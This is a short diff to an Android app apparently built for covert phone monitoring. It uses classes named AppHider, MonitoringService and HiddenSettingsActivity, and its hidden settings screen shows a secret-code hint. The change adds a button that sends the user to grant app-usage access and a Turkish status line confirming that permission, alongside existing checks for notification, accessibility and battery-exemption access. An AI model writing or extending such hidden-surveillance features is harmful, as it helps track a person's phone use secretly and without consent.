@@ -14,6 +14,7 @@ import com.takip.app.service.MonitoringService
 import com.takip.app.util.AppHider
 import com.takip.app.util.PermissionChecker
 import com.takip.app.util.PrefsManager
+import com.takip.app.util.UsageStatsHelper
 
 class HiddenSettingsActivity : AppCompatActivity() {
 
@@ -50,6 +51,10 @@ class HiddenSettingsActivity : AppCompatActivity() {
 
         binding.batteryButton.setOnClickListener {
             requestBatteryExemption()
+        }
+
+        binding.usageButton.setOnClickListener {
+            UsageStatsHelper.openSettings(this)
         }
 
         binding.secretCodeText.text = getString(R.string.secret_code_hint)
@@ -93,6 +98,7 @@ class HiddenSettingsActivity : AppCompatActivity() {
             appendLine("Bildirim erişimi: ${yesNo(perms.optBoolean("notifications"))}")
             appendLine("Erişilebilirlik: ${yesNo(perms.optBoolean("accessibility"))}")
             appendLine("Pil optimizasyonu kapalı: ${yesNo(perms.optBoolean("batteryOptimization"))}")
+            appendLine("Uygulama kullanımı: ${yesNo(perms.optBoolean("usageStats"))}")
         }
         binding.statusText.text = status
 
